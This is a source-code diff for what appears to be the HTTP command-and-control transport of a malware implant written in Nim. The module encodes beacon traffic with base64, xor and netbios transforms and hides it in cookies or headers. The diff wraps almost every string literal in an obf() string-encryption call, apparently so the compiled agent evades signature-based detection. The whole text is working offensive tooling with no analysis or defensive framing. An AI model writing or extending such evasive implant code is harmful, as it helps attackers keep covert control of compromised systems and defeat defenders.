@@ -1,6 +1,7 @@
 import std/[base64, strutils, json, tables, uri, sequtils]
 import http_client
-import ../utils/debug
+import debug
+import strenc
 
 # Transform functions (client-side - encoding)
 proc transformBase64(data: seq[byte]): seq[byte] =
@@ -127,28 +128,28 @@ proc applyClientTransforms(data: string, transforms: JsonNode): seq[byte] =
     return result
   
   for transform in transforms:
-    if not transform.hasKey("action"):
+    if not transform.hasKey(obf("action")):
       continue
     
-    let action = transform["action"].getStr()
-    let value = if transform.hasKey("value"): transform["value"].getStr() else: ""
+    let action = transform[obf("action")].getStr()
+    let value = if transform.hasKey(obf("value")): transform[obf("value")].getStr() else: ""
     
     debug "[DEBUG] Applying client transform: ", action
     
     case action
-    of "base64":
+    of obf("base64"):
       result = transformBase64(result)
-    of "base64url":
+    of obf("base64url"):
       result = transformBase64url(result)
-    of "xor":
+    of obf("xor"):
       result = transformXor(result, value)
-    of "prepend":
+    of obf("prepend"):
       result = transformPrepend(result, value)
-    of "append":
+    of obf("append"):
       result = transformAppend(result, value)
-    of "netbios":
+    of obf("netbios"):
       result = transformNetbios(result)
-    of "netbiosu":
+    of obf("netbiosu"):
       result = transformNetbiosu(result)
     else:
       debug "[DEBUG] Unknown transform: ", action
@@ -163,28 +164,28 @@ proc applyServerTransforms(data: seq[byte], transforms: JsonNode): seq[byte] =
   # Apply transforms in reverse order
   for i in countdown(transforms.len - 1, 0):
     let transform = transforms[i]
-    if not transform.hasKey("action"):
+    if not transform.hasKey(obf("action")):
       continue
     
-    let action = transform["action"].getStr()
-    let value = if transform.hasKey("value"): transform["value"].getStr() else: ""
+    let action = transform[obf("action")].getStr()
+    let value = if transform.hasKey(obf("value")): transform[obf("value")].getStr() else: ""
     
     debug "[DEBUG] Applying server transform (reverse): ", action
     
     case action
-    of "base64":
+    of obf("base64"):
       result = transformBase64Reverse(result)
-    of "base64url":
+    of obf("base64url"):
       result = transformBase64urlReverse(result)
-    of "xor":
+    of obf("xor"):
       result = transformXorReverse(result, value)
-    of "prepend":
+    of obf("prepend"):
       result = transformPrependReverse(result, value)
-    of "append":
+    of obf("append"):
       result = transformAppendReverse(result, value)
-    of "netbios":
+    of obf("netbios"):
       result = transformNetbiosReverse(result)
-    of "netbiosu":
+    of obf("netbiosu"):
       result = transformNetbiosuReverse(result)
     else:
       debug "[DEBUG] Unknown server transform: ", action
@@ -195,16 +196,16 @@ proc httpxPost*(url: string, body: string, postConfig: JsonNode): string =
   var requestData = cast[seq[byte]](body)
   
   # Apply client transforms if present
-  if postConfig.hasKey("client") and postConfig["client"].hasKey("transforms"):
-    requestData = applyClientTransforms(body, postConfig["client"]["transforms"])
+  if postConfig.hasKey(obf("client")) and postConfig[obf("client")].hasKey(obf("transforms")):
+    requestData = applyClientTransforms(body, postConfig[obf("client")][obf("transforms")])
     debug "[DEBUG] Request data after transforms: ", requestData.len, " bytes"
   
   # Create HTTP client using our custom wrapper (WinHTTP on Windows, httpclient on Linux)
   var client = newClientWrapper()
   
   # Add client headers if present
-  if postConfig.hasKey("client") and postConfig["client"].hasKey("headers"):
-    let headers = postConfig["client"]["headers"]
+  if postConfig.hasKey(obf("client")) and postConfig[obf("client")].hasKey(obf("headers")):
+    let headers = postConfig[obf("client")][obf("headers")]
     for key, val in headers.pairs:
       client.headers[key] = val.getStr()
       debug "[DEBUG] Request header: ", key, ": ", val.getStr()
@@ -212,20 +213,20 @@ proc httpxPost*(url: string, body: string, postConfig: JsonNode): string =
   # Prepare request based on message location
   var responseBody: string
   
-  if postConfig.hasKey("client") and postConfig["client"].hasKey("message"):
-    let message = postConfig["client"]["message"]
-    let location = message["location"].getStr()
-    let name = message["name"].getStr()
+  if postConfig.hasKey(obf("client")) and postConfig[obf("client")].hasKey(obf("message")):
+    let message = postConfig[obf("client")][obf("message")]
+    let location = message[obf("location")].getStr()
+    let name = message[obf("name")].getStr()
     
     case location
-    of "cookie":
+    of obf("cookie"):
       # Add as cookie
       let cookieValue = name & "=" & cast[string](requestData)
-      client.headers["Cookie"] = cookieValue
+      client.headers[obf("Cookie")] = cookieValue
       debug "[DEBUG] Request location: cookie (", name, ")"
       responseBody = client.postContent(url, "")
     
-    of "header":
+    of obf("header"):
       # Add as header
       client.headers[name] = cast[string](requestData)
       debug "[DEBUG] Request location: header (", name, ")"
@@ -248,8 +249,8 @@ proc httpxPost*(url: string, body: string, postConfig: JsonNode): string =
   var responseData = cast[seq[byte]](responseBody)
   
   # Apply server transforms if present
-  if postConfig.hasKey("server") and postConfig["server"].hasKey("transforms"):
-    responseData = applyServerTransforms(responseData, postConfig["server"]["transforms"])
+  if postConfig.hasKey(obf("server")) and postConfig[obf("server")].hasKey(obf("transforms")):
+    responseData = applyServerTransforms(responseData, postConfig[obf("server")][obf("transforms")])
     debug "[DEBUG] Response data after reverse transforms: ", responseData.len, " bytes"
   
   result = cast[string](responseData)
